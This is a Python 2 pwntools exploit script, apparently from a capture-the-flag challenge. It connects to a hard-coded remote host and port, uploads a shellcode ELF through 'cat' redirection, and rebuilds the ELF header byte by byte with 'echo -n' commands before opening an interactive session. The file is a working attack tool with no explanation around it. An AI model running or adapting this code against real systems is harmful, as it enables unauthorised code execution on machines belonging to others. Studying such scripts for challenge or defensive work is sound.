#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
# CUSTOM FUNCTIONS
def _snd(s):
  io.send(str(s))
def _sndl(s):
  io.sendline(str(s))
def _snda(a,s):
  io.sendafter(str(a),str(s))
def _sndla(a,s):
  io.sendlineafter(str(a),str(s))
def _rcvu(s):
  return io.recvuntil(str(s))
def _rcva():
  return io.recvall()
def _rcvn(n):
  return io.recv(n)
context.terminal = ['tmux', 'split', '-h']

context.update(arch='i386')
exe = './path/to/binary'

host = args.HOST or '160.94.179.150'
port = int(args.PORT or 4011)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

with open('shellcode.elf', 'rb') as f:
    elf = f.read()
from time import sleep

from binascii import hexlify, unhexlify

code = elf[84:]
print(code)
print (hexlify(code))

io.clean(5)
_sndl("cat > a")
io.clean(3)
_sndl("A" * 84 + code + "\x04")
io.clean(5)

def make_payload(cnt, val):
    val = "\\x" + hexlify(val)
    return "echo -n " + "A" * cnt + val + " >a"

for i in range(83, -1, -1):
    print ("write byte {}: {}".format(i, elf[i]))
    p = make_payload(i, elf[i])
    print (p)
    _sndl(p)
    io.clean(1)

io.interactive()

